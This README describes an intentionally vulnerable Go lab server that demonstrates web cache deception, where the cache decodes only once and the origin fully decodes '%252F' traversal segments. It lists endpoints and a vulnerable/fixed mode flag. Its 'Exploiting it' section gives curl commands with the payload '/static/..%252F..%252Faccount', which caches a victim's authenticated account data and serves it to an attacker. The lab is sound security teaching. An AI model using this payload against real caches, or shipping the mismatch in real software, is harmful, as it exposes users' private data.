# Web Cache Deception via Nested Encoding / Normalization Mismatch

This challenge demonstrates a cache-vs-origin decoding-depth mismatch: the shared cache percent-decodes a path only once before deciding cacheability, while the origin keeps decoding and normalizes `.`/`..` segments before routing. A doubly-encoded `/` (`%252F`) survives the cache's single decoding pass as an opaque `%2F` token — keeping the path looking like it's safely under `/static/` — while the origin fully decodes it into a real path separator and traversal that resolves to the authenticated `/account` endpoint.

## How to run it

```bash
go run main.go serve
```

## Endpoints

- `GET /account` — authenticated account data
- `GET /static/<anything>` — generic static asset content

## Exploiting it

```bash
# victim, authenticated, requests a nested-encoded traversal path
curl --path-as-is -H "Authorization: Bearer victim-secret-token" \
  "http://localhost:8080/static/..%252F..%252Faccount"

# attacker, unauthenticated, requests the same path and receives the victim's cached data
curl --path-as-is "http://localhost:8080/static/..%252F..%252Faccount"
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: the cache only decodes the path once before deciding cacheability
go run main.go serve --vulnerable=true

# fixed: the cache fully decodes and normalizes the path the same way the origin does
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
